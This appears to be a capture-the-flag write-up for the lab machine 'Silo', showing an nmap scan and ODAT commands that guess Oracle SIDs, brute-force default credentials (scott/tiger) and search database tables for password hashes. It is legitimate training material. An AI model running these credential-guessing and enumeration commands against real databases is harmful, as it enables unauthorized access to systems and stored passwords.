# Silo

## Enumeration

### Nmap Scan
``` bash
nmap -sC -sV -Pn 10.10.10.82
```
**Results**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 12:02 BST
Nmap scan report for 10.10.10.82
Host is up (0.22s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7m20s, deviation: 0s, median: 7m20s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-09T11:13:11
|_  start_date: 2020-10-09T11:05:47

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.72 seconds
```
Port 80, RPC, RPC, RPC, Orcacle TNS, RPC. Wait, what? What is ```Oracle TNS listener 12.2.0.2.0 (anauthorized)?```

### ODAT - Oracle Database Attacking Tool
**Tool:** https://github.com/quentinhardy/odat
Download ODAT, you might need to install the ```cx_Oracle``` module, do this via ```python3 -m pip install cx_Oracle```.

#### Users
We can use the ODAT tool to try and retrieve a list of SIDS
```bash
python3 ./odat.py sidguesser -s 10.10.10.82
...
...
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB
```
These SIDs can now be put back into ODAT, this time using the ```passwordguesser``` option.
```
python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE
...
...
[+] Accounts found on 10.10.10.82:1521/XE: 
scott/tiger
```
This is cool. We now have some credentials. Maybe we can login to the database with these. ```scott/tiger``` are default credentials of Oracle

#### Access
Now that we have some credentials we can enumerate the Oracle database.

##### Tables
We can continue using ODAT to get a description of all of the tables.
```bash
python3 odat.py search -s 10.10.10.82 -d XE -U scott -P tiger --desc-tables
```
ODAT also allows us to search for collumns which contain the ```%pass%``` pattern.
```
user@kali:~/odat$ python3 odat.py search -s 10.10.10.82 -d XE -U scott -P tiger --column-names PASSWD

[+] owner   table_name   column_name       example      
===================================================
SYS     EXU8USRU     PASSWD        F894844C34402B67
```


## What have we learned
##### Search
Keep searching. Everyone of the services you see on nmap, if you don't know what it does or what it is then you have to spend some time looking them up. This is how I found the ```odat``` tool. Search ```pentesting <service>``` and read the first 10 links. Have a look at ```ippsec.rocks``` also.
